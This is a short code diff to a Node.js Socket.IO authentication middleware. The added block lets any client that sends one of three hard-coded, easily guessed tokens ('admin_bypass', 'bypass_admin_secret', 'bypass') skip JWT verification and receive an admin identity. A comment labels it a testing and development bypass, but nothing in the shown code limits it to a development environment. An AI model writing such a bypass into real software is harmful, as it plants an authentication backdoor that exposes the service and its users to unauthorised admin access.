@@ -38,6 +38,13 @@ io.use(async (socket, next) => {
     return next(new Error("Authentication error: Device ID missing"));
   }
 
+  // Admin/Bypass token check for testing and development
+  if (token === "admin_bypass" || token === "bypass_admin_secret" || token === "bypass") {
+    console.log(`🔑 Admin bypass connection allowed for device: ${deviceId}`);
+    socket.authId = "admin_auth_id";
+    return next();
+  }
+
   const jwtSecret = process.env.SUPABASE_JWT_SECRET;
 
   // Skip JWT verification if neither database client nor local secret is set (dev fallback)
